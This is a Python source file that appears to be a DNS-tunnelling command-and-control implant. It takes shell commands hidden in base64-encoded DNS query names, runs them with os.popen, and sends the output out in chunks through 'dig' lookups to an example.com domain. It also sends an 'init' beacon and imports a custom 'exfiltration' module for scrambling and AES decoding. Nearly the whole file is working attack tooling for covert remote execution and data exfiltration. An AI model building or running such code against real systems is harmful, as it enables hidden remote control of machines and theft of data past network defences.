import socket
import exfiltration as exf
import dnslib as dns
import base64
from copy import deepcopy
import os
import time
import sys

#ip = str(sys.argv[1])
#port = int(sys.argv[2])




def dns_resolve(query, tcp):
        """ 
            Resolves DNS request from one client at the time.
            Encodes its actual data and forms DNS response from it.
        """
        request = dns.DNSRecord.parse(query)
        reply = request.reply()
        
        domain = request.q.get_qname()
        qtype =  request.q.qtype
        data = exf.domain_decode(str(domain), base64.urlsafe_b64decode)
        
        # If encryption key is present - decode it for futher data decryption
        if (len(request.questions) > 1):
            enc_domain = str(request.questions[1].get_qname())
            enc_key = exf.domain_decode(enc_domain, base64.urlsafe_b64decode)
            # Descramble key
            enc_key = exf.scramble(enc_key, (4, 12), True)

            # Check if the key is scramble offset
            if len(enc_key) < 3:
                enc_key = tuple(enc_key) 
                data = exf.scramble(data, enc_key, True)
            # Or AES decryption key
            else:
                enc_key = enc_key.decode()
                data = exf.aes_decrypt(data, enc_key)
            # reply.add_question(request.questions[1])

        
        
        #print(
            #f"Request: {request}\n",
            #f"reply : {reply}\n",
            #f"domain : {domain}\n",
            #f"qtypes : {qtype}\n",
            #f"data : {base64.b64decode(data.decode())}\n"
            #data
        #)
        #print("***", f"DNS QTYPE is {qtype}")
        #print("***", f"Original data length {len(data)} bytes")
        #print("***", f"{data[:24]}...")

        data = base64.b64encode(data)

        core_domain = deepcopy(domain)
        # Get TLD domain from original object
        core_domain.label = domain.label[-2:]

        if (qtype == dns.QTYPE.A):
            data = exf.ip_encode(data, False)
        
        elif (qtype == dns.QTYPE.AAAA):
            data = exf.ip_encode(data, True)

        elif (qtype ==  dns.QTYPE.TXT):
            data = [dns.TXT(data)]
        
        elif (qtype == 10):     # NULL type
            data = [dns.RD(data)]
        
        else:
            data = exf.domain_encode(data, str(core_domain), base64.urlsafe_b64encode)
            if (qtype == dns.QTYPE.CNAME):
                data = [dns.CNAME(data)]
            elif (qtype ==  dns.QTYPE.MX):
                data = [dns.MX(data)]
            elif (qtype == dns.QTYPE.NS):
                data = [dns.NS(data)]

        for rd in data:
            reply.add_answer(dns.RR(str(domain), rtype=qtype, rdata=rd))
        
        raw_reply = reply.pack()
        # Truncate large (> 512 bytes) data for UDP payload
        if (len(raw_reply) > exf.MAX_DNS_LEN and not tcp):
            print("DNS", f"Response message is big! Truncate it...")
            reply.header.set_tc(1)
            raw_reply = reply.pack()[:exf.MAX_DNS_LEN]
        
        #print("DNS", f"Sending back the request in size {len(raw_reply)} bytes\n")
        return raw_reply

def chunk(data, chunk_size) -> list:
    """ Splits data into equal-sized chunks. """
    return [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]

def senddata(query):
    request = dns.DNSRecord.parse(query)
    reply = request.reply()
    
    domain = request.q.get_qname()
  
    data = exf.domain_decode(str(domain), base64.urlsafe_b64decode).decode()

    
    if '#@' in data: # replacing spaces
        data = data.replace('#@',' ') 


    if '##' in data:    # replacing dots
        data = data.replace('##','.')
    
    if 'cd' in data:
        data = data.replace('#@',' ').split()
        os.chdir(data[1])
        data = 'pwd'


        

    d = os.popen(data).read().encode() 
    print(data)
    #print(chunk(data_encode,63))
    
    print(d)
    d_encode = base64.b64encode(d) + base64.b64encode('reda'.encode())
    #print(chunk(d_encode,58))

    for i in range(len(chunk(d_encode,58))):
        print(chunk(d_encode.decode(),58)[i])
        os.system(f' dig {chunk(d_encode.decode(),58)[i]}.example.com @127.0.0.1 -p 53 > /dev/null 2>&1')
        

    else:
        try:

            print(data)
            #print(chunk(data_encode,63))
            d = os.popen(data.decode()).read().encode()
            print(d)
            d_encode = base64.b64encode(d)
            #print(chunk(d_encode,58))

            for i in range(len(chunk(d_encode,58))):
                print(chunk(d_encode.decode(),58)[i])
                os.system(f' dig {chunk(d_encode.decode(),58)[i]}.example.com @127.0.0.1 -p 53 >/dev/null 2>&1')
        except:
            pass



def init():
    init_process = False
    try:
        print("-"*10)
        print("[*] Init\n[**]Sending Request")

        os.popen('dig init.example.com @127.0.0.1 -p 53')
        if 'refused' in os.popen('dig init.example.com @127.0.0.1 -p 53').read():
            print('[**] Trying')
        elif 'init' in  os.popen('dig init.example.com @127.0.0.1 -p 53').read():
            init_process = True
        else:
            init_process = True
            
    except:
        init_process = True
        print(init)
        pass
    return init_process


sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
#sock.sendto("bytesToSend".encode(),('194.35.12.225',53))
sock.bind(('127.0.0.1',5333))

sr = False
while True:
    try:
        if sr == False:
            while True:
                try:
                    if init() == True:
                        break
                    elif init() == False:
                        time.sleep(5)
                        init()
                    
                        print(init())
                    

                    else:
                        break
    
                except KeyboardInterrupt:
                    break
        

        sr = True

        print("SERVER IS REAdy")
        data1, addr = sock.recvfrom(1024)
        print(data1)

        print("TCP", f"{addr} connected")
        
        response = dns_resolve(data1,False)
        sock.sendto(response, addr)
        
        senddata(data1)

    except KeyboardInterrupt:
        print('[***] BYE !!')
        break


    